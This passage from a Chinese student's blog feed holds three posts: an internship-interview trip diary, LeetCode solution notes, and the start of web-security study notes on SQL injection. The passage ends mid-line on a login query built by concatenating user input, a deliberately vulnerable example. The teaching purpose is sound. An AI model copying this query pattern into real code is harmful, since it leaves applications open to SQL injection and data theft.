title="前路漫漫，努力向前"></a>前路漫漫，努力向前</h2><p>一月的北京待我还算客气，据说因为我的到来，帝都的气温都比往日温和了些（手动滑稽O(∩-∩)O哈哈~）<br>按照之前的计划，我准备在上半年直到九月份开学（如果研究生考试一切顺利）找一份实习，一边积累自己的经验，也顺便一边赚些许的工资（虽然没啥大的期待，但是起码能给父母减轻些负担吧，毕竟也老大不小咯ε=(´ο｀*)))）所以考研结束后就一直计划投几个简历试一试。自己真的很幸运能遇到这么多天南地北的小哥哥小姐姐，能帮我内推（不然估计我那简历别人可能看都不看O(∩_∩)O哈哈~），小伙伴们确实给力，虽然现在的计算机就业形式不是太好，但没多久就收到了好几家的面试邀请。因为考的P大，所以本着就近原则就选择了在北京的三家（长亭，360，iqiyi），早早地就买好了车票，订好了房间，计划三天时间，每天一家，剩下的时间也顺便去看看帝都的同学好友，聚一聚，耍一耍。但是突然接到电话，360的大佬说要电话面试，然后不用去公司面了，便想着先攒攒经验（因为凭我这点本事本来就不太可能能进），就约了时间电话面试。果然，这一面发现了很多问题，赶紧查漏补缺！</p><p>然后7号下了火车就直奔中关村了。下午直奔长亭，和nice的小哥哥进行了差不多一小时的技术面试。小哥哥真是太好了，基本没怎么为难我（谁让我这么菜呢~）然后和nice的小姐姐又进了几十分钟的hr面，还见了大学期间技术最棒的同学（也在长亭工作）真的感觉长亭真是太棒了，很亲切，氛围尤其舒服！一想年后就能去给大佬们端茶倒水我就激动地不行O(∩_∩)O哈哈！！！面试结束后就去找在附近读研究生的同学了~</p><p>8号去了宾馆对面的iqiyi大厦准备体验一下大公司的氛围（主要是想亲眼见一见<a href="http://www.lijiejie.com/" target="_blank" rel="noopener">李姐姐</a>），杰哥待我去了面试的地方，之后是他的同事负责面试，两轮都是技术面，第一面感觉偏安全，第二轮主要是谈了开发的一些问题，虽然气氛紧张中夹杂着尴尬，但我也发现了自己与现实的差距究竟如何，也是抱着学习的态度吧~虽然面试结束时结果如何我已猜到，但这次面试还是让自己收获了很多东西~</p><h2 id="时光不老，我们不散"><a href="#时光不老，我们不散" class="headerlink" title="时光不老，我们不散"></a>时光不老，我们不散</h2><p>由于面试基本上一上午or下午就结束了，所以每天都有多半天的时间可以自由活动，在海淀学习工作的同学很多，便趁这机会和他们小聚一下哈哈哈，有小学同学，中学同学，大学同学，毕业半年没见的，一年没见的，还有六七年没见的，这次都见到啦真的很开心(^▽^)。虽然赶上了期末考试季，但是他们还是都挤出时间陪我逛校园请我吃大餐，回家一想好像这三天每天都是白吃白喝ε=(´ο｀*)))哈哈，我真的很感动！谢谢小伙伴们的热情款待，等我实习发了工资，请你们吃个够哈哈！！就在9号也就是最后一天，没有面试，便去了之前没去过的圆明园，走啊走，几乎逛了75%？？反正是从下午一直到晚上人家公园关门才算逛完，脚丫子也妥妥废了o(╥﹏╥)o本以为面试结果还要等好几天，结果正面对着圆明园的古迹满心感慨的我突然接到了长亭小姐姐的电话！过了！！！哈哈哈开心！！！！最最最最最梦寐以求的公司此刻向我打开了大门！！！！！真是太幸运了！！！2019年第一个愿望算是实现啦！O(∩_∩)O哈哈~希望过年后的研究生复试也还能顺利哈哈哈！<br>不过虽然说是拿到了长亭的实习offer但是我自己的能力还是太菜，得好好把握这次来之不易的机会！！！好好努力，好好学习！！加油ヾ(◍°∇°◍)ﾉﾞ</p><h3 id="PS-七牛的图床不能用了，想着能不能自己搭一个呢？？"><a href="#PS-七牛的图床不能用了，想着能不能自己搭一个呢？？" class="headerlink" title="PS.七牛的图床不能用了，想着能不能自己搭一个呢？？"></a>PS.七牛的图床不能用了，想着能不能自己搭一个呢？？</h3><hr><blockquote><p><em>声明：</em><br>文章标题：<a href="http://blog.rookiehacker.org/2019/01/10/getoffer/" title="【北京之行】圆满完成任务！拿到实习offer！">【北京之行】圆满完成任务！拿到实习offer！</a><br>文章作者：<a href="http://blog.rookiehacker.org/about/">RookieHacker</a><br>文章链接：<a href="http://blog.rookiehacker.org/2019/01/10/getoffer/" title="【北京之行】圆满完成任务！拿到实习offer！">http://blog.rookiehacker.org/2019/01/10/getoffer/</a><br>文章版权属本博主所有，有问题或者建议欢迎在下方评论。欢迎转载、引用，但请标明作者和原文地址，谢谢。</p></blockquote><hr><p><em>喜欢，就支持我一下吧~</em></p><hr><p><iframe src="http://blog.rookiehacker.org/donate-page/simple/" style="overflow-x:hidden;overflow-y:hidden; border:0xp none #fff; min-height:240px; width:100%;" frameborder="0" scrolling="no"></iframe></p><hr>]]></content>
    
    <summary type="html">
    
      三天北京之旅圆满结束，去了很多地方，见了很多人，经历了很多，学习了~
    
    </summary>
    
      <category term="生活" scheme="http://blog.rookiehacker.org/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
      <category term="实习" scheme="http://blog.rookiehacker.org/tags/%E5%AE%9E%E4%B9%A0/"/>
    
      <category term="面试" scheme="http://blog.rookiehacker.org/tags/%E9%9D%A2%E8%AF%95/"/>
    
      <category term="offer" scheme="http://blog.rookiehacker.org/tags/offer/"/>
    
  </entry>
  
  <entry>
    <title>【LeetCode】刷题笔记(ing~)</title>
    <link href="http://blog.rookiehacker.org/2019/01/05/LeetCode/"/>
    <id>http://blog.rookiehacker.org/2019/01/05/LeetCode/</id>
    <published>2019-01-05T05:46:38.000Z</published>
    <updated>2019-01-05T06:33:46.177Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="No-1-两数之和"><a href="#No-1-两数之和" class="headerlink" title="No.1 两数之和"></a>No.1 两数之和</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>难度<br>简单</p><p>给定一个整数数组 nums 和一个目标值 target，请你在该数组中找出和为目标值的那 两个 整数，并返回他们的数组下标。</p><p>你可以假设每种输入只会对应一个答案。但是，你不能重复利用这个数组中同样的元素。</p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">给定 nums = [2, 7, 11, 15], target = 9</span><br><span class="line"></span><br><span class="line">因为 nums[0] + nums[1] = 2 + 7 = 9</span><br><span class="line">所以返回 [0, 1]</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">[c]</span><br><span class="line">/**</span><br><span class="line"> * Note: The returned array must be malloced, assume caller calls free().</span><br><span class="line"> */</span><br><span class="line">int* twoSum(int* nums, int numsSize, int target)</span><br><span class="line">&#123;</span><br><span class="line">    static int a[2]=&#123;0&#125;;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">for (int i = 0; i &lt; numsSize - 1; i++)</span><br><span class="line">&#123;</span><br><span class="line">for (int j = i+1; j &lt; numsSize; j++)</span><br><span class="line">&#123;</span><br><span class="line">if (nums[i] + nums[j] == target)</span><br><span class="line">&#123;</span><br><span class="line">a[0] = i;</span><br><span class="line">a[1] = j;</span><br><span class="line">return a;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="No-2-两数相加"><a href="#No-2-两数相加" class="headerlink" title="No.2 两数相加"></a>No.2 两数相加</h1><h2 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h2><p>难度<br>中等</p><p>给出两个 非空 的链表用来表示两个非负的整数。其中，它们各自的位数是按照 逆序 的方式存储的，并且它们的每个节点只能存储 一位 数字。</p><p>如果，我们将这两个数相加起来，则会返回一个新的链表来表示它们的和。</p><p>您可以假设除了数字 0 之外，这两个数都不会以 0 开头。</p><h2 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：(2 -&gt; 4 -&gt; 3) + (5 -&gt; 6 -&gt; 4)</span><br><span class="line">输出：7 -&gt; 0 -&gt; 8</span><br><span class="line">原因：342 + 465 = 807</span><br></pre></td></tr></table></figure><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><h2 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">[cpp]</span><br><span class="line">/**</span><br><span class="line"> * Definition for singly-linked list.</span><br><span class="line"> * struct ListNode &#123;</span><br><span class="line"> *     int val;</span><br><span class="line"> *     struct ListNode *next;</span><br><span class="line"> * &#125;;</span><br><span class="line"> */</span><br><span class="line">#include&lt;math.h&gt;</span><br><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    struct ListNode* addTwoNumbers(struct ListNode* l1, struct ListNode* l2) &#123;</span><br><span class="line">        ListNode * ans = new ListNode(0);</span><br><span class="line">        ListNode * s = ans;</span><br><span class="line">        int flag = 0;</span><br><span class="line">        int i = 0;</span><br><span class="line">        int nt = 0;</span><br><span class="line">        while(l1&amp;&amp;l2)&#123;</span><br><span class="line">            nt = l1-&gt;val + l2-&gt;val;</span><br><span class="line">            if(flag==1)&#123;</span><br><span class="line">                nt+=1;</span><br><span class="line">            &#125;</span><br><span class="line">            if(nt &gt;= 10)&#123;</span><br><span class="line">                flag = 1;</span><br><span class="line">                nt = nt % 10;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                flag = 0;</span><br><span class="line">            &#125;</span><br><span class="line">            l1 = l1-&gt;next;</span><br><span class="line">            l2 = l2-&gt;next;</span><br><span class="line">            ans-&gt;val = nt;</span><br><span class="line">            if(!l1&amp;&amp;!l2&amp;&amp;flag==1)&#123;</span><br><span class="line">                ans -&gt; next = new ListNode(0);</span><br><span class="line">                ans = ans -&gt; next;</span><br><span class="line">                ans -&gt; val = 1;</span><br><span class="line">                ans -&gt;next = NULL;</span><br><span class="line">                </span><br><span class="line">                </span><br><span class="line">            &#125;else if(l1&amp;&amp;l2)&#123;</span><br><span class="line">                ans-&gt;next = new ListNode(0);</span><br><span class="line">                ans = ans-&gt;next;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                while(l1)&#123;</span><br><span class="line">                    if(flag == 1)&#123;</span><br><span class="line">                        nt = 1 + l1-&gt;val;</span><br><span class="line">                    &#125;else&#123;</span><br><span class="line">                        nt = l1-&gt;val;</span><br><span class="line">                    &#125;</span><br><span class="line">                    if(nt &gt;= 10)&#123;</span><br><span class="line">                        flag = 1;</span><br><span class="line">                        nt = nt % 10;</span><br><span class="line">                    &#125;else&#123;</span><br><span class="line">                        flag = 0;</span><br><span class="line">                    &#125;</span><br><span class="line">                    ans -&gt; next = new ListNode(0);</span><br><span class="line">                    ans = ans -&gt; next;</span><br><span class="line">                    ans-&gt;val = nt;</span><br><span class="line">                    l1 = l1-&gt;next;</span><br><span class="line">                    if(!l1)&#123;</span><br><span class="line">                        ans-&gt;next = NULL;</span><br><span class="line">                    &#125;</span><br><span class="line">                        </span><br><span class="line">                &#125;</span><br><span class="line">                while(l2)&#123;</span><br><span class="line">                    if(flag == 1)&#123;</span><br><span class="line">                        nt = 1 + l2-&gt;val;</span><br><span class="line">                    &#125;else&#123;</span><br><span class="line">                        nt = l2-&gt;val;</span><br><span class="line">                    &#125;</span><br><span class="line">                    if(nt &gt;= 10)&#123;</span><br><span class="line">                        flag = 1;</span><br><span class="line">                        nt = nt % 10;</span><br><span class="line">                    &#125;else&#123;</span><br><span class="line">                        flag = 0;</span><br><span class="line">                    &#125;</span><br><span class="line">                    ans -&gt; next = new ListNode(0);</span><br><span class="line">                    ans = ans -&gt; next;</span><br><span class="line">                    ans-&gt;val = nt;</span><br><span class="line">                    l2 = l2-&gt;next;</span><br><span class="line">                    if(!l2)&#123;</span><br><span class="line">                        ans-&gt;next = NULL;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                if(flag == 1)&#123;</span><br><span class="line">                    ans -&gt; next = new ListNode(0);</span><br><span class="line">                    ans = ans -&gt; next;</span><br><span class="line">                    ans-&gt;val = 1;</span><br><span class="line">                    ans -&gt; next = NULL;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        return s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="No-7-整数反转"><a href="#No-7-整数反转" class="headerlink" title="No.7 整数反转"></a>No.7 整数反转</h1><h2 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h2><p>难度<br>简单<br>给出一个 32 位的有符号整数，你需要将这个整数中每位上的数字进行反转。</p><h2 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">示例 1:</span><br><span class="line"></span><br><span class="line">输入: 123</span><br><span class="line">输出: 321</span><br><span class="line"> 示例 2:</span><br><span class="line"></span><br><span class="line">输入: -123</span><br><span class="line">输出: -321</span><br><span class="line">示例 3:</span><br><span class="line"></span><br><span class="line">输入: 120</span><br><span class="line">输出: 21</span><br><span class="line">注意:</span><br><span class="line"></span><br><span class="line">假设我们的环境只能存储得下 32 位的有符号整数，则其数值范围为 [−231,  231 − 1]。请根据这个假设，如果反转后整数溢出那么就返回 0。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><h2 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[java]</span><br><span class="line"></span><br><span class="line">class Solution &#123;</span><br><span class="line">    public int reverse(int x) &#123;</span><br><span class="line">        boolean flag = true;</span><br><span class="line">        if (x &lt; 0) &#123;</span><br><span class="line">            x = Math.abs(x);</span><br><span class="line">            flag = false;</span><br><span class="line">        &#125;</span><br><span class="line">        StringBuffer reverse = new StringBuffer();</span><br><span class="line">        reverse.append(x);</span><br><span class="line">        try &#123;</span><br><span class="line">            int a = Integer.parseInt(reverse.reverse().toString());</span><br><span class="line">            if (flag) &#123;</span><br><span class="line">                return a;</span><br><span class="line">            &#125;else &#123;</span><br><span class="line">                return -a;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="No-60-第k个排列"><a href="#No-60-第k个排列" class="headerlink" title="No.60 第k个排列"></a>No.60 第k个排列</h1><h2 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h2><p>难度<br>中等<br>给出集合 [1,2,3,…,n]，其所有元素共有 n! 种排列。</p><p>按大小顺序列出所有排列情况，并一一标记，当 n = 3 时, 所有排列如下：</p><p>“123”<br>“132”<br>“213”<br>“231”<br>“312”<br>“321”<br>给定 n 和 k，返回第 k 个排列。</p><p>说明：</p><p>给定 n 的范围是 [1, 9]。<br>给定 k 的范围是[1,  n!]。</p><h2 id="示例-3"><a href="#示例-3" class="headerlink" title="示例"></a>示例</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">示例 1:</span><br><span class="line"></span><br><span class="line">输入: n = 3, k = 3</span><br><span class="line">输出: &quot;213&quot;</span><br><span class="line">示例 2:</span><br><span class="line"></span><br><span class="line">输入: n = 4, k = 9</span><br><span class="line">输出: &quot;2314&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h2><p>这道题是让求出n个数字的第k个排列组合，由于其特殊性，我们不用将所有的排列组合的情况都求出来，然后返回其第k个，我们可以只求出第k个排列组合即可，那么难点就在于如何知道数字的排列顺序，可参见<a href="https://bangbingsyb.blogspot.com/2014/11/leetcode-permutation-sequence.html" target="_blank" rel="noopener">Here</a>。<br>首先我们要知道当n = 3时，其排列组合共有3! = 6种，当n = 4时，其排列组合共有4! = 24种，我们就以n = 4, k = 17的情况来分析，所有排列组合情况如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">1234</span><br><span class="line">1243</span><br><span class="line">1324</span><br><span class="line">1342</span><br><span class="line">1423</span><br><span class="line">1432</span><br><span class="line">2134</span><br><span class="line">2143</span><br><span class="line">2314 </span><br><span class="line">2341</span><br><span class="line">2413</span><br><span class="line">2431</span><br><span class="line">3124</span><br><span class="line">3142</span><br><span class="line">3214</span><br><span class="line">3241</span><br><span class="line">3412&lt;--- k = 17</span><br><span class="line">3421</span><br><span class="line">4123</span><br><span class="line">4132</span><br><span class="line">4213</span><br><span class="line">4231</span><br><span class="line">4312</span><br><span class="line">4321</span><br></pre></td></tr></table></figure><p>我们可以发现，每一位上1,2,3,4分别都出现了6次，当第一位上的数字确定了，后面三位上每个数字都出现了2次，当第二位也确定了，后面的数字都只出现了1次，当第三位确定了，那么第四位上的数字也只能出现一次，那么下面我们来看k = 17这种情况的每位数字如何确定，由于k = 17是转化为数组下标为16：</p><p>最高位可取1,2,3,4中的一个，每个数字出现3！= 6次，所以k = 16的第一位数字的下标为16 / 6 = 2，即3被取出<br>第二位此时从1,2,4中取一个，k = 16时，k’ = 16 % (3!) = 4，而剩下的每个数字出现2！= 2次，所以第二数字的下标为4 / 2 = 2，即4被取出<br>第三位此时从1,2中去一个，k’ = 4时，k’’ = 4 % (2!) = 0，而剩下的每个数字出现1！= 1次，所以第三个数字的下标为 0 / 1 = 0，即1被取出<br>第四位是从2中取一个，k’’ = 0时，k’’’ = 0 % (1!) = 0，而剩下的每个数字出现0！= 1次，所以第四个数字的下标为0 / 1= 0，即2被取出</p><p>那么我们就可以找出规律了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a1 = k / (n - 1)!</span><br><span class="line">k1 = k</span><br><span class="line"></span><br><span class="line">a2 = k1 / (n - 2)!</span><br><span class="line">k2 = k1 % (n - 2)!</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">an-1 = kn-2 / 1!</span><br><span class="line">kn-1 = kn-2 / 1!</span><br><span class="line"></span><br><span class="line">an = kn-1 / 0!</span><br><span class="line">kn = kn-1 % 0!</span><br></pre></td></tr></table></figure><h2 id="题解-3"><a href="#题解-3" class="headerlink" title="题解"></a>题解</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[cpp]</span><br><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    string getPermutation(int n, int k) &#123;</span><br><span class="line">        string res;</span><br><span class="line">        string num = &quot;123456789&quot;;</span><br><span class="line">        vector&lt;int&gt; f(n, 1);</span><br><span class="line">        for (int i = 1; i &lt; n; ++i) f[i] = f[i - 1] * i;</span><br><span class="line">        --k;</span><br><span class="line">        for (int i = n; i &gt;= 1; --i) &#123;</span><br><span class="line">            int j = k / f[i - 1];</span><br><span class="line">            k %= f[i - 1];</span><br><span class="line">            res.push_back(num[j]);</span><br><span class="line">            num.erase(j, 1);</span><br><span class="line">        &#125;</span><br><span class="line">        return res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><blockquote><p><em>声明：</em><br>文章标题：<a href="http://blog.rookiehacker.org/2019/01/05/LeetCode/" title="【LeetCode】刷题笔记(ing~)">【LeetCode】刷题笔记(ing~)</a><br>文章作者：<a href="http://blog.rookiehacker.org/about/">RookieHacker</a><br>文章链接：<a href="http://blog.rookiehacker.org/2019/01/05/LeetCode/" title="【LeetCode】刷题笔记(ing~)">http://blog.rookiehacker.org/2019/01/05/LeetCode/</a><br>文章版权属本博主所有，有问题或者建议欢迎在下方评论。欢迎转载、引用，但请标明作者和原文地址，谢谢。</p></blockquote><hr><p><em>喜欢，就支持我一下吧~</em></p><hr><p><iframe src="http://blog.rookiehacker.org/donate-page/simple/" style="overflow-x:hidden;overflow-y:hidden; border:0xp none #fff; min-height:240px; width:100%;" frameborder="0" scrolling="no"></iframe></p><hr>]]></content>
    
    <summary type="html">
    
      LeetCode日常~
    
    </summary>
    
      <category term="LeetCode" scheme="http://blog.rookiehacker.org/categories/LeetCode/"/>
    
    
      <category term="LeetCode" scheme="http://blog.rookiehacker.org/tags/LeetCode/"/>
    
  </entry>
  
  <entry>
    <title>【Web渗透】是时候重拾技能了</title>
    <link href="http://blog.rookiehacker.org/2019/01/03/renewmywebsec/"/>
    <id>http://blog.rookiehacker.org/2019/01/03/renewmywebsec/</id>
    <published>2019-01-03T10:50:36.000Z</published>
    <updated>2019-01-03T14:19:14.652Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=426342137&auto=0&height=66"></iframe><h1 id="心痛"><a href="#心痛" class="headerlink" title="心痛"></a>心痛</h1><p>为什么心痛？因为今天电话面试了，然后被问懵了。。对。。确实是懵逼了。。虽然都是一些很基础的东西，但是那些此刻熟悉而又陌生的名字就是在嘴边打转却又不知该从何说起。。时间是个好东西，能够让你忘记过去经历过的伤痛，却也一样能让你忘记你以后要靠它们吃饭的东西。</p><p>面试官：“我看你简历上说懂SQL注入、XSS、CSRF、缓冲区溢出、文件包含等，来说一下什么是SQL注入？常用的工具有什么？命令呢？”、“XSS和CSRF有什么区别？”、“Html和Xml有什么区别？”、“在有密码错误次数限制的系统上能使用爆破吗？”、“会Java吗？”、“会PHP吗？”。。。<br>我：“我懂那么一点吧。。”……“好像这个有点印象，但是时间长给忘了”……“这个忘了。。”……“这个也忘了。。”￣□￣｜｜ 尴尬不？刺激不？ε=(´ο｀*)))唉是时候拾起来了</p><h1 id="记笔记"><a href="#记笔记" class="headerlink" title="记笔记"></a>记笔记</h1><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>SQL攻击（SQL injection），简称注入攻击，是发生于应用程序之数据库层的安全漏洞。简而言之，是在输入的字符串之中注入SQL指令，在设计不良的程序当中忽略了检查，那么这些注入进去的指令就会被数据库服务器误认为是正常的SQL指令而运行，因此遭到破坏或是入侵。</p><h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><p>在应用程序中若有下列状况，则可能应用程序正暴露在SQL Injection的高风险情况下：</p><p>在应用程序中使用字符串联结方式组合SQL指令。<br>在应用程序链接数据库时使用权限过大的账户（例如很多开发人员都喜欢用sa（内置的最高权限的系统管理员账户）连接Microsoft SQL Server数据库）。<br>在数据库中开放了不必要但权力过大的功能（例如在Microsoft SQL Server数据库中的xp_cmdshell延伸预存程序或是OLE Automation预存程序等）<br>太过于信任用户所输入的数据，未限制输入的字元数，以及未对用户输入的数据做潜在指令的检查。</p><h3 id="作用原理"><a href="#作用原理" class="headerlink" title="作用原理"></a>作用原理</h3><p>SQL命令可查询、插入、更新、删除等，命令的串接。而以分号字元为不同命令的区别。（原本的作用是用于SubQuery或作为查询、插入、更新、删除……等的条件式）<br>SQL命令对于传入的字符串参数是用单引号字元所包起来。（但连续2个单引号字元，在SQL资料库中，则视为字串中的一个单引号字元）<br>SQL命令中，可以注入注解（连续2个减号字元 – 后的文字为注解，或<code>“/*”</code>与<code>“*/”</code>所包起来的文字为注解）<br>因此，如果在组合SQL的命令字符串时，未针对单引号字元作取代处理的话，将导致该字元变数在填入命令字符串时，被恶意窜改原本的SQL语法的作用。</p><h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><p>某个网站的登录验证的SQL查询代码为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[java] </span><br><span class="line">   </span><br><span class="line">strSQL = &quot;SELECT * FROM users WHERE (name = &apos;&quot; + userName + &quot;&apos;) and (pw = &apos;&quot;+ passWord 